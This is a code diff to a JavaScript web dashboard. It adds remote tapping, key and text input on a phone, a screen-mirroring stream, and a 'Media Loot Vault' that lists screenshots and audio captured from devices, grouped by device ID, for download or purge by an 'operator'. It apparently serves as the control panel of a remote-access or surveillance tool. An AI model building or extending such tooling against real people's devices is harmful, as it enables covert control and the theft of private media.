@@ -327,7 +327,8 @@ function updateVision(key) {
     if (key === lastScreenshot) return;
     lastScreenshot = key;
     const cleanKey = key.replace('local:', '');
-    const url = `/api/asset/${cleanKey}?t=${Date.now()}`;
+    // BUG#3 FIX: Use /screenshots/ path (matches server static route)
+    const url = `/screenshots/${cleanKey}?t=${Date.now()}`;
     
     const dashImg = document.getElementById('dashboard-vision-img');
     const mainImg = document.getElementById('main-vision-img');
@@ -573,9 +574,185 @@ async function pollSwarmFeed() {
 }
 setInterval(pollSwarmFeed, 5000);
 
+// ── Remote Control ─────────────────────────────────────
+let streamInterval = null;
+
+async function remoteClick(e) {
+    const img = e.target;
+    const rect = img.getBoundingClientRect();
+    const x_raw = e.clientX - rect.left;
+    const y_raw = e.clientY - rect.top;
+    
+    // Scale to original screen size (assuming 1080x2400 for Redmi Note 14)
+    const x = Math.round((x_raw / rect.width) * 1080);
+    const y = Math.round((y_raw / rect.height) * 2400);
+    
+    // Feedback
+    const fb = document.getElementById('click-feedback');
+    if (fb) {
+        fb.style.left = (e.clientX - rect.left - 10) + 'px';
+        fb.style.top = (e.clientY - rect.top - 10) + 'px';
+        fb.style.display = 'block';
+        setTimeout(() => fb.style.display = 'none', 300);
+    }
+
+    await fetch('/api/agent/remote-control', {
+        method: 'POST',
+        headers: H,
+        body: JSON.stringify({ action: 'tap', params: { x, y } })
+    });
+    
+    // Auto-refresh after click
+    setTimeout(refreshScreen, 800);
+}
+
+async function remoteKey(keycode) {
+    await fetch('/api/agent/remote-control', {
+        method: 'POST',
+        headers: H,
+        body: JSON.stringify({ action: 'key', params: { keycode } })
+    });
+    setTimeout(refreshScreen, 800);
+}
+
+async function remoteSendText() {
+    const input = document.getElementById('remote-text-input');
+    const text = input.value;
+    if (!text) return;
+    await fetch('/api/agent/remote-control', {
+        method: 'POST',
+        headers: H,
+        body: JSON.stringify({ action: 'text', params: { text } })
+    });
+    input.value = '';
+    setTimeout(refreshScreen, 1200);
+}
+
+async function startStream() {
+    if (streamInterval) return;
+    addLog('INFO', 'Neural Mirror Stream started.');
+    const dot = document.getElementById('stream-status');
+    if (dot) dot.classList.add('pulse');
+    
+    // BUG#1 FIX: Use /api/command (not /api/agent/remote-control) to route native commands
+    await sendCommand('mirror_start');
+    
+    // Poll for latest frame every 1.5s for smooth stream
+    streamInterval = setInterval(pullLatestFrame, 1500);
+    pullLatestFrame();
+}
+
+async function stopStream() {
+    clearInterval(streamInterval);
+    streamInterval = null;
+    const dot = document.getElementById('stream-status');
+    if (dot) dot.classList.remove('pulse');
+    
+    // BUG#1 FIX: Use /api/command for native commands
+    await sendCommand('mirror_stop');
+    addLog('INFO', 'Neural Mirror Stream stopped.');
+}
+
+async function pullLatestFrame() {
+    try {
+        const r = await fetch('/api/screen/frame', { headers: H });
+        const data = await r.json();
+        if (data.key) {
+            // BUG#3 FIX: consistent URL format /screenshots/{key}
+            const url = `/screenshots/${data.key}?t=${Date.now()}`;
+            const imgMain = document.getElementById('main-vision-img');
+            const imgDash = document.getElementById('dashboard-vision-img');
+            const ph = document.getElementById('main-vision-placeholder');
+            const phDash = document.getElementById('vision-placeholder');
+            
+            if (imgMain) { imgMain.src = url; imgMain.style.display='block'; }
+            if (imgDash) { imgDash.src = url; imgDash.style.display='block'; }
+            if (ph) ph.style.display = 'none';
+            if (phDash) phDash.style.display = 'none';
+        }
+    } catch(e) { console.warn('pullLatestFrame error:', e.message); }
+}
+
+// ── Media Loot Vault ─────────────────────────────────
+async function refreshLoot() {
+    const filter = document.getElementById('loot-filter')?.value || 'all';
+    try {
+        const r = await fetch(`/api/loot/list?type=${filter}&limit=200`, { headers: H });
+        const data = await r.json();
+        const items = data.items || [];
+        
+        const grid = document.getElementById('loot-grid');
+        const totalEl = document.getElementById('loot-count');
+        const imgEl   = document.getElementById('loot-img-count');
+        const audioEl = document.getElementById('loot-audio-count');
+        
+        const imgs   = items.filter(i => i.type === 'image').length;
+        const audios = items.filter(i => i.type === 'audio').length;
+        if (totalEl) totalEl.textContent = items.length;
+        if (imgEl)   imgEl.textContent = imgs;
+        if (audioEl) audioEl.textContent = audios;
+        
+        if (!grid) return;
+        if (items.length === 0) {
+            grid.innerHTML = `<div class="text-dim" style="font-size:0.8rem; grid-column:1/-1; padding:2rem; text-align:center;">
+                <i class="fas fa-inbox fa-2x" style="opacity:0.3; display:block; margin-bottom:0.5rem;"></i>
+                Vault is empty. Capture screenshots or audio from the device.</div>`;
+            return;
+        }
+        
+        grid.innerHTML = items.map(item => {
+            const ts = new Date(item.ts * 1000).toLocaleString();
+            const size = (item.size / 1024).toFixed(1) + ' KB';
+            const isImg = item.type === 'image';
+            const preview = isImg
+                ? `<img src="${item.url}?t=${Date.now()}" style="width:100%; height:140px; object-fit:cover; border-radius:8px; display:block; background:#111;" loading="lazy" onerror="this.style.display='none'">`
+                : `<div style="height:140px; display:flex; flex-direction:column; align-items:center; justify-content:center; background:#0a0a0f; border-radius:8px; gap:0.5rem;">
+                     <i class="fas fa-microphone-lines fa-2x text-purple"></i>
+                     <audio controls src="${item.url}" style="width:90%; margin-top:0.5rem;"></audio>
+                   </div>`;
+            return `<div style="background:rgba(255,255,255,0.03); border:1px solid rgba(255,255,255,0.07); border-radius:12px; overflow:hidden; padding:0.75rem; transition:border-color 0.2s;" 
+                        onmouseover="this.style.borderColor='rgba(139,92,246,0.4)'" 
+                        onmouseout="this.style.borderColor='rgba(255,255,255,0.07)'">
+                ${preview}
+                <div style="margin-top:0.6rem; font-size:0.65rem; color:#6b7280;">${ts}</div>
+                <div style="font-size:0.65rem; color:#4b5563;">${item.device_id} &bull; ${size}</div>
+                <div style="display:flex; gap:0.4rem; margin-top:0.6rem;">
+                    <a href="${item.url}" download class="micro-btn" style="flex:1; text-align:center; text-decoration:none;">
+                        <i class="fas fa-download"></i> Save
+                    </a>
+                    <button class="micro-btn danger" onclick="deleteLoot('${item.id}')" style="flex-shrink:0;">
+                        <i class="fas fa-trash"></i>
+                    </button>
+                </div>
+            </div>`;
+        }).join('');
+        
+    } catch(e) {
+        console.error('Loot refresh error:', e.message);
+    }
+}
+
+async function deleteLoot(id) {
+    try {
+        await fetch(`/api/loot/${id}`, { method: 'DELETE', headers: H });
+        refreshLoot();
+    } catch(e) { console.error('Delete loot error:', e); }
+}
+
+async function clearAllLoot() {
+    if (!confirm('Purge ALL media loot? This cannot be undone.')) return;
+    try {
+        await fetch('/api/loot', { method: 'DELETE', headers: H });
+        refreshLoot();
+        addLog('WARN', 'Media Loot Vault purged by operator.');
+    } catch(e) { console.error('Clear loot error:', e); }
+}
+
 // ── Init ─────────────────────────────────────────────
 setInterval(poll, 3000);
 initWebSocket();
 poll();
 document.getElementById('chat-input')?.addEventListener('keydown', e => { if (e.key === 'Enter') sendChatMessage(); });
 document.getElementById('browser-url')?.addEventListener('keydown', e => { if (e.key === 'Enter') browserGo(); });
+// Auto-refresh loot vault every 15s
+setInterval(() => { if (document.getElementById('panel-loot')?.classList.contains('active')) refreshLoot(); }, 15000);
